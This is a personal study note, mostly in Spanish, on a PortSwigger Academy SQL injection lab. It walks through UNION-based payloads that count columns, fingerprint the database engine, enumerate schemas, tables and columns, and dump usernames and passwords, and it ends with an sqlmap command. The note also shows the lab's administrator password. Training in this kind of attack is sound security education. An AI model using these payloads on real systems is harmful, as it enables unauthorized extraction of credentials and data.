#labs #web #ejercicio

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

[ACCESS THE LAB](https://portswigger.net/academy/labs/launch/81986add1fa6ec438867539cc2f562f01dcf9faf6a0b82766269c3dbeef30b00?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-non-oracle)

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.

 
 **Objetivo:** usar inyección SQL para enumerar esquemas, tablas y columnas y volcar datos sensibles cuando el motor **NO** es Oracle (el reto real usa PostgreSQL 12.x, pero los payloads incluyen equivalentes para MySQL y SQL Server por si PortSwigger rota la tecnología).

---

### 1️⃣ Identificar nº de columnas y tipos  

| Paso | Payload | ¿Qué vemos? / Acción |
|------|---------|-----------------------|
| Orden creciente | `' ORDER BY 1-- -` … `' ORDER BY 3-- -` | Falla en 3 ⇒ hay **2** columnas. |
| Compatibilidad tipo | `' UNION SELECT NULL,NULL-- -` | Si devuelve página normal → ambas columnas aceptan *NULL* (cualquier tipo). Usaremos cadenas para simplificar. |

---

### 2️⃣ Obtener **versión** del motor  

| DB | Payload 2 col | Información devuelta | ¿Para qué sirve? |
|----|---------------|----------------------|------------------|
| **PostgreSQL** | `' UNION SELECT version(), 'a'-- -` | `PostgreSQL 12.22 (Ubuntu…)` | Saber:<br>• Exploits disponibles (CVE)<br>• Funciones nativas (`string_agg`, `jsonb`)<br>• SO subyacente |
| **MySQL** | `' UNION SELECT @@version, 'a'-- -` | `8.0.36-0ubuntu0.22.04.1` | Saber si soporta `information_schema` completo, `sys` schema, etc. |
| **SQL Server** | `' UNION SELECT @@version, 'a'-- -` | `Microsoft SQL Server 2019...` | Distinguir entre Express / Enterprise; elegir vistas `sys.*`. |

> 📝 **Tip:** añadir `current_database(), current_schema()` (Postgres) o `database()` (MySQL) para confirmar contexto.

---

### 3️⃣ Enumerar **schemas / owners**  

| Motor | Payload | Comentario |
|-------|---------|------------|
| PostgreSQL | `' UNION SELECT DISTINCT table_schema, 'a' FROM information_schema.tables-- -` | Devuelve `public`, `pg_catalog`, etc. |
| MySQL | `' UNION SELECT DISTINCT table_schema, 'a' FROM information_schema.tables-- -` | Lista todos los *databases*. |
| SQL Server | `' UNION SELECT name, 'a' FROM sys.schemas-- -` | Usa vistas `sys`. |

#### Jugar con los schemas (PostgreSQL)
* Cambiar la ruta de búsqueda:  
```sql
  ' UNION SELECT set_config(''search_path'',''pg_catalog,public'',false), 'a'-- -
  
  permite referenciar funciones/objetos sin schema explícito.
```
---

### 4️⃣ Listar tablas del schema deseado  

' UNION SELECT table_name, 'a'
  FROM information_schema.tables
  WHERE table_schema='public'-- -

*En MySQL cambia `table_schema='nombre_db'`.*

---

### 5️⃣ Listar columnas de la tabla objetivo  

```sql
' UNION SELECT column_name, 'a'
  FROM information_schema.columns
  WHERE table_name='users_iutnts'
    AND table_schema='public'-- -
```
> ⚠️ Asegúrate de mayúsculas/minúsculas exactas en Postgres (no case‑insensitive).

---

### 6️⃣ Volcar datos 

```sql
' UNION SELECT password_etmopb, username_nfzryt
  FROM public.users_iutnts-- -
```

**Resultado esperado**  
```
administrator | ks6auqhg66sr7cbeu4gj
```

---

## Resumen de payloads clave (PostgreSQL)

```sql
-- Número de columnas
' ORDER BY 2-- -

-- Version + DB
' UNION SELECT version(), current_database()-- -

-- Schemas
' UNION SELECT DISTINCT table_schema, NULL
  FROM information_schema.tables-- -

-- Tablas dentro de public
' UNION SELECT table_name, NULL
  FROM information_schema.tables
  WHERE table_schema='public'-- -

-- Columnas de users_iutnts
' UNION SELECT column_name, NULL
  FROM information_schema.columns
  WHERE table_name='users_iutnts'
    AND table_schema='public'-- -

-- Dump de datos
' UNION SELECT password_etmopb, username_nfzryt
  FROM public.users_iutnts-- -
```

---

## 🛠️ Checklist rápida

1. **`ORDER BY` →** columnas.  
2. **`UNION SELECT NULL,…`** → tipo compatible.  
3. **`version()` / `@@version`** → motor & parches.  
4. **`information_schema` o `sys`** → esquemas, tablas, columnas.  
5. Añadir `table_schema='X'` para afinar búsqueda.  
6. Prefijar `<schema>.<table>` para evitar ambigüedades.  
7. Extraer datos sensibles y resolver el lab.

> 💬 *Pro tip:* automatiza con **sqlmap** pasándole sólo `-u "https://TARGET/filter?category=*" --dbs --batch` una vez confirmada la inyección manualmente.


